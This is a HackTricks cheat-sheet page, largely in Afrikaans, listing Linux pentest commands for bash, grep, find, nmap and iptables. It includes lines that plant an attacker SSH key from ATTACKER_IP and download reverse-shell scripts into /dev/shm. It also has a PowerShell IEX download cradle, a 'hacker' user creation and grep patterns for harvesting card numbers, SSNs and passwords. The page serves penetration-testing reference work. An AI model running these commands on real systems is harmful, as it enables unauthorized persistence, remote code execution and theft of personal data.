# Nuttige Linux-opdragte

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik en outomatiese werkstrome te bou met behulp van die wêreld se mees gevorderde gemeenskapsinstrumente.\
Kry vandag toegang:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy in HackTricks wil adverteer** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslagplekke.

</details>

## Algemene Bash
```bash
#Exfiltration using Base64
base64 -w 0 file

#Get HexDump without new lines
xxd -p boot12.bin | tr -d '\n'

#Add public key to authorized keys
curl https://ATTACKER_IP/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys

#Echo without new line and Hex
echo -n -e

#Count
wc -l <file> #Lines
wc -c #Chars

#Sort
sort -nr #Sort by number and then reverse
cat file | sort | uniq #Sort and delete duplicates

#Replace in file
sed -i 's/OLD/NEW/g' path/file #Replace string inside a file

#Download in RAM
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py

#Files used by network processes
lsof #Open files belonging to any process
lsof -p 3 #Open files used by the process
lsof -i #Files used by networks processes
lsof -i 4 #Files used by network IPv4 processes
lsof -i 6 #Files used by network IPv6 processes
lsof -i 4 -a -p 1234 #List all open IPV4 network files in use by the process 1234
lsof +D /lib #Processes using files inside the indicated dir
lsof -i :80 #Files uses by networks processes
fuser -nv tcp 80

#Decompress
tar -xvzf /path/to/yourfile.tgz
tar -xvjf /path/to/yourfile.tbz
bzip2 -d /path/to/yourfile.bz2
tar jxf file.tar.bz2
gunzip /path/to/yourfile.gz
unzip file.zip
7z -x file.7z
sudo apt-get install xz-utils; unxz file.xz

#Add new user
useradd -p 'openssl passwd -1 <Password>' hacker

#Clipboard
xclip -sel c < cat file.txt

#HTTP servers
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
php -S $ip:80

#Curl
#json data
curl --header "Content-Type: application/json" --request POST --data '{"password":"password", "username":"admin"}' http://host:3000/endpoint
#Auth via JWT
curl -X GET -H 'Authorization: Bearer <JWT>' http://host:3000/endpoint

#Send Email
sendEmail -t to@email.com -f from@email.com -s 192.168.8.131 -u Subject -a file.pdf #You will be prompted for the content

#DD copy hex bin file without first X (28) bytes
dd if=file.bin bs=28 skip=1 of=blob

#Mount .vhd files (virtual hard drive)
sudo apt-get install libguestfs-tools
guestmount --add NAME.vhd --inspector --ro /mnt/vhd #For read-only, create first /mnt/vhd

# ssh-keyscan, help to find if 2 ssh ports are from the same host comparing keys
ssh-keyscan 10.10.10.101

# Openssl
openssl s_client -connect 10.10.10.127:443 #Get the certificate from a server
openssl x509 -in ca.cert.pem -text #Read certificate
openssl genrsa -out newuser.key 2048 #Create new RSA2048 key
openssl req -new -key newuser.key -out newuser.csr #Generate certificate from a private key. Recommended to set the "Organizatoin Name"(Fortune) and the "Common Name" (newuser@fortune.htb)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Create certificate
openssl x509 -req -in newuser.csr -CA intermediate.cert.pem -CAkey intermediate.key.pem -CAcreateserial -out newuser.pem -days 1024 -sha256 #Create a signed certificate
openssl pkcs12 -export -out newuser.pfx -inkey newuser.key -in newuser.pem #Create from the signed certificate the pkcs12 certificate format (firefox)
# If you only needs to create a client certificate from a Ca certificate and the CA key, you can do it using:
openssl pkcs12 -export -in ca.cert.pem -inkey ca.key.pem -out client.p12
# Decrypt ssh key
openssl rsa -in key.ssh.enc -out key.ssh
#Decrypt
openssl enc -aes256 -k <KEY> -d -in backup.tgz.enc -out b.tgz

#Count number of instructions executed by a program, need a host based linux (not working in VM)
perf stat -x, -e instructions:u "ls"

#Find trick for HTB, find files from 2018-12-12 to 2018-12-14
find / -newermt 2018-12-12 ! -newermt 2018-12-14 -type f -readable -not -path "/proc/*" -not -path "/sys/*" -ls 2>/dev/null

#Reconfigure timezone
sudo dpkg-reconfigure tzdata

#Search from which package is a binary
apt-file search /usr/bin/file #Needed: apt-get install apt-file

#Protobuf decode https://www.ezequiel.tech/2020/08/leaking-google-cloud-projects.html
echo "CIKUmMesGw==" | base64 -d | protoc --decode_raw

#Set not removable bit
sudo chattr +i file.txt
sudo chattr -i file.txt #Remove the bit so you can delete it

# List files inside zip
7z l file.zip
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik en outomatiese werksvloeie te bou met behulp van die wêreld se mees gevorderde gemeenskapsinstrumente.\
Kry vandag toegang:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Bash vir Windows
```bash
#Base64 for Windows
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0

#Exe compression
upx -9 nc.exe

#Exe2bat
wine exe2bat.exe nc.exe nc.txt

#Compile Windows python exploit to exe
pip install pyinstaller
wget -O exploit.py http://www.exploit-db.com/download/31853
python pyinstaller.py --onefile exploit.py

#Compile for windows
#sudo apt-get install gcc-mingw-w64-i686
i686-mingw32msvc-gcc -o executable useradd.c
```
## Greps

Grep is a powerful command-line tool used for searching and filtering text. It allows you to search for specific patterns or strings within files or output. Here are some useful grep commands:

### Basic Grep

The basic syntax for using grep is as follows:

```bash
grep [options] pattern [file...]
```

- `pattern` is the string or regular expression you want to search for.
- `file` is the file or files you want to search within. If no file is specified, grep will search from standard input.

### Searching for a Pattern in a File

To search for a pattern in a specific file, use the following command:

```bash
grep pattern file
```

For example, to search for the word "password" in the file `example.txt`, you would use:

```bash
grep password example.txt
```

### Searching for a Pattern in Multiple Files

To search for a pattern in multiple files, use the following command:

```bash
grep pattern file1 file2 file3
```

For example, to search for the word "password" in the files `file1.txt`, `file2.txt`, and `file3.txt`, you would use:

```bash
grep password file1.txt file2.txt file3.txt
```

### Searching for a Pattern in a Directory

To search for a pattern in all files within a directory, use the following command:

```bash
grep pattern directory/*
```

For example, to search for the word "password" in all files within the `documents` directory, you would use:

```bash
grep password documents/*
```

### Ignoring Case Sensitivity

By default, grep is case-sensitive. To ignore case sensitivity and search for a pattern regardless of case, use the `-i` option:

```bash
grep -i pattern file
```

For example, to search for the word "password" in the file `example.txt` without considering case sensitivity, you would use:

```bash
grep -i password example.txt
```

### Displaying Line Numbers

To display line numbers along with the matching lines, use the `-n` option:

```bash
grep -n pattern file
```

For example, to search for the word "password" in the file `example.txt` and display the line numbers, you would use:

```bash
grep -n password example.txt
```

### Searching Recursively

To search for a pattern recursively in all files within a directory and its subdirectories, use the `-r` option:

```bash
grep -r pattern directory
```

For example, to search for the word "password" recursively in all files within the `documents` directory, you would use:

```bash
grep -r password documents
```

### Inverting the Match

To invert the match and display lines that do not contain the pattern, use the `-v` option:

```bash
grep -v pattern file
```

For example, to search for lines in the file `example.txt` that do not contain the word "password", you would use:

```bash
grep -v password example.txt
```

### Using Regular Expressions

Grep supports the use of regular expressions for more advanced pattern matching. To use regular expressions, use the `-E` option:

```bash
grep -E "regex" file
```

For example, to search for lines in the file `example.txt` that start with "password" followed by any three characters, you would use:

```bash
grep -E "^password..." example.txt
```

These are just a few examples of how grep can be used. It is a versatile tool that can be combined with other commands to perform complex text searches and manipulations.
```bash
#Extract emails from file
grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt

#Extract valid IP addresses
grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" file.txt

#Extract passwords
grep -i "pwd\|passw" file.txt

#Extract users
grep -i "user\|invalid\|authentication\|login" file.txt

# Extract hashes
#Extract md5 hashes ({32}), sha1 ({40}), sha256({64}), sha512({128})
egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' *.txt | egrep -o '[a-fA-F0-9]{32}' > md5-hashes.txt
#Extract valid MySQL-Old hashes
grep -e "[0-7][0-9a-f]{7}[0-7][0-9a-f]{7}" *.txt > mysql-old-hashes.txt
#Extract blowfish hashes
grep -e "$2a\$\08\$(.){75}" *.txt > blowfish-hashes.txt
#Extract Joomla hashes
egrep -o "([0-9a-zA-Z]{32}):(w{16,32})" *.txt > joomla.txt
#Extract VBulletin hashes
egrep -o "([0-9a-zA-Z]{32}):(S{3,32})" *.txt > vbulletin.txt
#Extraxt phpBB3-MD5
egrep -o '$H$S{31}' *.txt > phpBB3-md5.txt
#Extract Wordpress-MD5
egrep -o '$P$S{31}' *.txt > wordpress-md5.txt
#Extract Drupal 7
egrep -o '$S$S{52}' *.txt > drupal-7.txt
#Extract old Unix-md5
egrep -o '$1$w{8}S{22}' *.txt > md5-unix-old.txt
#Extract md5-apr1
egrep -o '$apr1$w{8}S{22}' *.txt > md5-apr1.txt
#Extract sha512crypt, SHA512(Unix)
egrep -o '$6$w{8}S{86}' *.txt > sha512crypt.txt

#Extract e-mails from text files
grep -E -o "\b[a-zA-Z0-9.#?$*_-]+@[a-zA-Z0-9.#?$*_-]+.[a-zA-Z0-9.-]+\b" *.txt > e-mails.txt

#Extract HTTP URLs from text files
grep http | grep -shoP 'http.*?[" >]' *.txt > http-urls.txt
#For extracting HTTPS, FTP and other URL format use
grep -E '(((https|ftp|gopher)|mailto)[.:][^ >"	]*|www.[-a-z0-9.]+)[^ .,;	>">):]' *.txt > urls.txt
#Note: if grep returns "Binary file (standard input) matches" use the following approaches # tr '[\000-\011\013-\037177-377]' '.' < *.log | grep -E "Your_Regex" OR # cat -v *.log | egrep -o "Your_Regex"

#Extract Floating point numbers
grep -E -o "^[-+]?[0-9]*.?[0-9]+([eE][-+]?[0-9]+)?$" *.txt > floats.txt

# Extract credit card data
#Visa
grep -E -o "4[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > visa.txt
#MasterCard
grep -E -o "5[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > mastercard.txt
#American Express
grep -E -o "\b3[47][0-9]{13}\b" *.txt > american-express.txt
#Diners Club
grep -E -o "\b3(?:0[0-5]|[68][0-9])[0-9]{11}\b" *.txt > diners.txt
#Discover
grep -E -o "6011[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > discover.txt
#JCB
grep -E -o "\b(?:2131|1800|35d{3})d{11}\b" *.txt > jcb.txt
#AMEX
grep -E -o "3[47][0-9]{2}[ -]?[0-9]{6}[ -]?[0-9]{5}" *.txt > amex.txt

# Extract IDs
#Extract Social Security Number (SSN)
grep -E -o "[0-9]{3}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > ssn.txt
#Extract Indiana Driver License Number
grep -E -o "[0-9]{4}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > indiana-dln.txt
#Extract US Passport Cards
grep -E -o "C0[0-9]{7}" *.txt > us-pass-card.txt
#Extract US Passport Number
grep -E -o "[23][0-9]{8}" *.txt > us-pass-num.txt
#Extract US Phone Numberss
grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' *.txt > us-phones.txt
#Extract ISBN Numbers
egrep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" *.txt > isbn.txt
```
## Vind

The `find` command is used to search for files and directories in a specified location. It can be used with various options to filter the search results based on different criteria.

### Syntax:

```
find [path] [expression]
```

### Voorbeelde:

1. Vind alle bestande in die huidige gids:

   ```
   find .
   ```

2. Vind alle bestande met 'txt' in die naam:

   ```
   find . -name "*txt*"
   ```

3. Vind alle leë gids in die huidige gids:

   ```
   find . -type d -empty
   ```

4. Vind alle bestande wat groter is as 1 MB:

   ```
   find . -size +1M
   ```

5. Vind alle bestande wat in die afgelope 7 dae gewysig is:

   ```
   find . -mtime -7
   ```

6. Vind alle bestande wat eienaarskap is deur 'gebruiker':

   ```
   find . -user gebruiker
   ```

7. Vind alle bestande wat uitvoerbaar is:

   ```
   find . -type f -executable
   ```

8. Vind alle bestande wat deur 'groep' besit word:

   ```
   find . -group groep
   ```

9. Vind alle bestande wat nie deur 'gebruiker' besit word nie:

   ```
   find . ! -user gebruiker
   ```

10. Vind alle bestande wat die afgelope 30 minute gewysig is:

    ```
    find . -mmin -30
    ```

### Opmerkings:

- Die `path`-argument spesifiseer die beginpunt van die soektog. As dit nie opgegee word nie, sal die huidige gids gebruik word.
- Die `expression`-argument bevat die verskillende opsies en voorwaardes wat gebruik word om die soektog te verfyn.
- Die `find`-opdrag kan baie kragtig wees, so wees versigtig wanneer jy dit gebruik.
```bash
# Find SUID set files.
find / -perm /u=s -ls 2>/dev/null

# Find SGID set files.
find / -perm /g=s -ls 2>/dev/null

# Found Readable directory and sort by time.  (depth = 4)
find / -type d -maxdepth 4 -readable -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Found Writable directory and sort by time.  (depth = 10)
find / -type d -maxdepth 10 -writable -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Or Found Own by Current User and sort by time. (depth = 10)
find / -maxdepth 10 -user $(id -u) -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Or Found Own by Current Group ID and Sort by time. (depth = 10)
find / -maxdepth 10 -group $(id -g) -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Found Newer files and sort by time. (depth = 5)
find / -maxdepth 5 -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less

# Found Newer files only and sort by time. (depth = 5)
find / -maxdepth 5 -type f -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less

# Found Newer directory only and sort by time. (depth = 5)
find / -maxdepth 5 -type d -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less
```
## Nmap soekhulp

Nmap is 'n kragtige en veelsydige netwerk skandering hulpmiddel wat gebruik kan word om netwerktoestelle te ontdek en hul veiligheid te ondersoek. Hier is 'n paar nuttige opdragte en voorbeelde om jou te help om Nmap effektief te gebruik:

### Basiese skandering

Om 'n basiese skandering uit te voer, gebruik die volgende opdrag:

```
nmap <target>
```

Vervang `<target>` met die IP-adres of die domeinnaam van die teikenstelsel.

### Spesifieke poorte skandering

As jy spesifieke poorte wil skandeer, gebruik die `-p` vlag gevolg deur die poortnommers. Byvoorbeeld:

```
nmap -p 80,443 <target>
```

Hierdie opdrag sal slegs poorte 80 en 443 op die teikenstelsel skandeer.

### Volledige skandering

Om 'n volledige skandering uit te voer, gebruik die `-p-` vlag. Byvoorbeeld:

```
nmap -p- <target>
```

Hierdie opdrag sal alle poorte op die teikenstelsel skandeer.

### Skandering van spesifieke protokolle

As jy slegs spesifieke protokolle wil skandeer, gebruik die `--top-ports` vlag gevolg deur die aantal poorte wat jy wil skandeer. Byvoorbeeld:

```
nmap --top-ports 10 <target>
```

Hierdie opdrag sal die top 10 poorte op die teikenstelsel skandeer.

### Aggressiewe skandering

Om 'n aggressiewe skandering uit te voer, gebruik die `-A` vlag. Byvoorbeeld:

```
nmap -A <target>
```

Hierdie opdrag sal verskillende inligting oor die teikenstelsel versamel, soos bedryfstelsel, dienste, en versie-inligting.

### Stil skandering

As jy 'n stil skandering wil uitvoer, gebruik die `-sS` vlag. Byvoorbeeld:

```
nmap -sS <target>
```

Hierdie opdrag sal probeer om die skandering so stil as moontlik uit te voer.

### Skandering van subnetwerk

Om 'n subnetwerk te skandeer, gebruik die `/` gevolg deur die subnetmasker. Byvoorbeeld:

```
nmap <subnet>/<subnetmasker>
```

Vervang `<subnet>` met die subnetwerkadres en `<subnetmasker>` met die subnetmasker.

### Uitvoer na 'n lêer

Om die uitvoer na 'n lêer te stuur, gebruik die `>` gevolg deur die lêernaam. Byvoorbeeld:

```
nmap <target> > uitvoer.txt
```

Hierdie opdrag sal die uitvoer van die skandering stuur na 'n lêer genaamd "uitvoer.txt".

Dit is slegs 'n paar voorbeelde van hoe jy Nmap kan gebruik. Daar is baie meer funksies en opsies beskikbaar. Vir meer inligting, gebruik die `nmap --help` opdrag of besoek die [Nmap-dokumentasie](https://nmap.org/docs.html).
```bash
#Nmap scripts ((default or version) and smb))
nmap --script-help "(default or version) and *smb*"
locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
nmap --script-help "(default or version) and smb)"
```
## Bash

Bash is die standaard skulpry in die meeste Linux-stelsels en is 'n kragtige en veelsydige skulpry wat gebruik kan word vir verskeie take. Hier is 'n paar nuttige opdragte en tegnieke wat jy kan gebruik om jou Linux-stelsel te hardloop en te beveilig:

### Opdragte

- `ls`: Lys die inhoud van 'n gids.
- `cd`: Verander die huidige gids.
- `pwd`: Druk die pad van die huidige gids af.
- `mkdir`: Skep 'n nuwe gids.
- `rm`: Verwyder 'n lêer of gids.
- `cp`: Kopieer 'n lêer of gids.
- `mv`: Verskuif of hernoem 'n lêer of gids.
- `cat`: Druk die inhoud van 'n lêer af.
- `grep`: Soek na 'n patroon in 'n lêer.
- `chmod`: Verander die toestemmings van 'n lêer of gids.
- `chown`: Verander die eienaar van 'n lêer of gids.
- `ps`: Lys aktiewe prosesse.
- `kill`: Beëindig 'n proses.
- `top`: Wys 'n lys van aktiewe prosesse en hul gebruik van hulpbronne.
- `df`: Wys inligting oor die beskikbare diskruimte.
- `du`: Wys die grootte van 'n lêer of gids.
- `history`: Wys die geskiedenis van uitgevoerde opdragte.

### Tegnieke

- **Pyp**: Gebruik die `|`-teken om die uitset van die een opdrag as die inset van 'n ander opdrag te gebruik. Byvoorbeeld: `ls -l | grep .txt` sal alle lêers met die `.txt`-uitbreiding in die huidige gids wys.
- **Redirigeer**: Gebruik die `>`-teken om die uitset van 'n opdrag na 'n lêer te stuur. Byvoorbeeld: `ls > lêers.txt` sal die inhoud van die huidige gids na 'n lêer met die naam `lêers.txt` skryf.
- **Agtergrond**: Voeg die `&`-teken by die einde van 'n opdrag om dit in die agtergrond uit te voer. Byvoorbeeld: `ping google.com &` sal die `ping`-opdrag in die agtergrond uitvoer en jou die beheer oor die skulpry teruggee.
- **Vars**: Gebruik die `$`-teken om die waarde van 'n veranderlike op te roep. Byvoorbeeld: `echo $HOME` sal die pad van jou tuisgids afdruk.
- **Lusse**: Gebruik die `for`- of `while`-opdragte om herhalende take uit te voer. Byvoorbeeld: `for i in {1..5}; do echo $i; done` sal die getalle 1 tot 5 afdruk.

Met hierdie opdragte en tegnieke kan jy jou Linux-stelsel effektief bestuur en beveilig.
```bash
#All bytes inside a file (except 0x20 and 0x00)
for j in $((for i in {0..9}{0..9} {0..9}{a..f} {a..f}{0..9} {a..f}{a..f}; do echo $i; done ) | sort | grep -v "20\|00"); do echo -n -e "\x$j" >> bytes; done
```
## Iptables

Iptables is 'n kragtige hulpmiddel wat gebruik word vir die konfigurasie van die firewall in Linux-stelsels. Dit stel gebruikers in staat om verkeer te beheer deur middel van verskillende reëls en beleide. Hier is 'n paar nuttige opdragte wat met iptables gebruik kan word:

### Opdragte

- `iptables -L`: Gee 'n lys van alle huidige iptables-reëls.
- `iptables -F`: Vee alle huidige iptables-reëls skoon.
- `iptables -A <chain> -p <protocol> --dport <port> -j <action>`: Voeg 'n nuwe reël by die gespesifiseerde ketting. Die `<chain>` parameter verwys na die ketting waarin die reël geplaas moet word, `<protocol>` verwys na die protokol van die verkeer (byvoorbeeld tcp of udp), `<port>` verwys na die poortnommer en `<action>` verwys na die aksie wat geneem moet word (byvoorbeeld ACCEPT, DROP of REJECT).
- `iptables -D <chain> <rule_number>`: Verwyder die gespesifiseerde reël uit die ketting.
- `iptables -P <chain> <policy>`: Stel die verstekbeleid in vir die gespesifiseerde ketting. Die `<policy>` parameter kan ingestel word as ACCEPT, DROP of REJECT.

### Voorbeelde

- `iptables -A INPUT -p tcp --dport 22 -j ACCEPT`: Voeg 'n reël by die INPUT-ketting om inkomende TCP-verkeer op poort 22 toe te laat.
- `iptables -A INPUT -p tcp --dport 80 -j DROP`: Voeg 'n reël by die INPUT-ketting om inkomende TCP-verkeer op poort 80 te blokkeer.
- `iptables -A OUTPUT -p udp --dport 53 -j ACCEPT`: Voeg 'n reël by die OUTPUT-ketting om uitgaande UDP-verkeer op poort 53 toe te laat.

Dit is slegs 'n paar voorbeelde van die gebruik van iptables. Daar is baie meer funksies en opsies beskikbaar wat dit 'n kragtige instrument maak vir die beheer van verkeer in Linux-stelsels.
```bash
#Delete curent rules and chains
iptables --flush
iptables --delete-chain

#allow loopback
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

#drop ICMP
iptables -A INPUT -p icmp -m icmp --icmp-type any -j DROP
iptables -A OUTPUT -p icmp -j DROP

#allow established connections
iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT

#allow ssh, http, https, dns
iptables -A INPUT -s 10.10.10.10/24 -p tcp -m tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 443 -j ACCEPT
iptables -A INPUT -p udp -m udp --sport 53 -j ACCEPT
iptables -A INPUT -p tcp -m tcp --sport 53 -j ACCEPT
iptables -A OUTPUT -p udp -m udp --dport 53 -j ACCEPT
iptables -A OUTPUT -p tcp -m tcp --dport 53 -j ACCEPT

#default policies
iptables -P INPUT DROP
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
```
<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-opslag.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik en **outomatiese werksvloeie** te bou met behulp van die wêreld se **mees gevorderde** gemeenskapsinstrumente.\
Kry vandag toegang:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
